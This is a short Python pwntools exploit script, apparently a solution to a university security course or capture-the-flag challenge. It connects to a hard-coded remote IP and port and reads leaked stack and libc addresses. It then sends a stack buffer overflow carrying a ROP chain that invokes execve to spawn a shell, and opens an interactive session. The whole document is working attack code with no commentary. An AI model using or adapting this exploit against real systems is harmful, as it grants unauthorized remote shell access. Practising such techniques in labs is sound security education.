#! /usr/bin/env python3
import struct
from pwn import *
import os, ctypes

def rop(base):
    pop_rdi = [base + 0x26b72, base + 0x1b75aa]
    pop_rsi = [base + 0x27529, 0]
    xor_rdx = [base + 0x142071]
    pop_rax = [base + 0x4a54f, 0x3b]
    syscall = [base + 0x2584d]
    chain = b''.join(map(p64, pop_rdi + pop_rsi + xor_rdx + pop_rax + syscall))
    return chain 


io =  remote('107.21.135.41', 5555)

io.recvuntil(b'base pointer: ')
bp = int(io.recvline(keepends=False),16)

io.recvuntil(b'will be stored: ')
buf = int(io.recvline(keepends=False),16)

io.recvuntil(b'libc: ')
lib_c_base = int(io.recvline(keepends=False),16)

# print(f'base address: {lib_c_base:x}')

# exploit = cyclic(bp+8-buf) + rop(lib_c_base)

exploit = b'a'*(bp+8-buf) + rop(lib_c_base)

io.recvuntil(b'ASURITE ID:')

io.sendline(exploit)

io.interactive()